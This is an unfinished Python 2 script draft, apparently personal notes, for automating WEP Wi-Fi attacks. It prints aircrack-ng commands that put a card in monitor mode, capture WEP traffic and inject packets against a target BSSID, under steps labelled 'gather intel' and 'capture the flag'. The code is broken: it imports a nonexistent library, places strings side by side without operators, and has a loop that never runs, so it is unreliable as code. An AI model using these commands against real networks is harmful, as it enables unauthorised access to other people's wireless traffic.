'''For speed and accuracy try to make as automated as possible, a shell script for multiple types of intrusions, collisions and captures
Test for python3
Figure out the commands for terminal based wlan connections, perhaps on wicd
'''
import fileinput,sys,libtime                           ''' some time library to count down in seconds, fileinput to read in files, sys for various system cmds '''

filename = 'flagsCaptured-01.csv'
target_BSSID = '0'
source_BSSID = '0'
deauth_BSSID = '0'
BSSID_counter = 0

'''step one: gather intel'''

print "airmon-ng start wlan0"
print "airodump-ng --encrypt WEP mon0"          '''the -w option for airodump-ng writes to a few files, be sure to overwrite these files upon multiple use,store data from each file in vars!!!!'''
print "^C"

'''
format the text of flagsCaptured-01.csv function:
remove useless BSSIDs function: ie targets with no deauth targets
count #of bssids function here:
'''

'''
for target_BSSID in fileinput.input([filename], inplace = True):
    target_BSSID = target_BSSID.replace(x,y)
    # sys.stdout is redirected to the file
    sys.stdout.write(target_BSSID)
'''

while (BSSID_counter > 0):
    '''step two: capture the flag'''
    
    print 'aireplay-ng -a ' target_BSSID ' -h ' source_BSSID ' mon0 '                  '-m for min length, -n for max length'
    
    '''step three: unencrypt the flag'''
    
    BSSID_counter = BSSID_counter - 1                                                  '''subtracts counter for finite loop'''
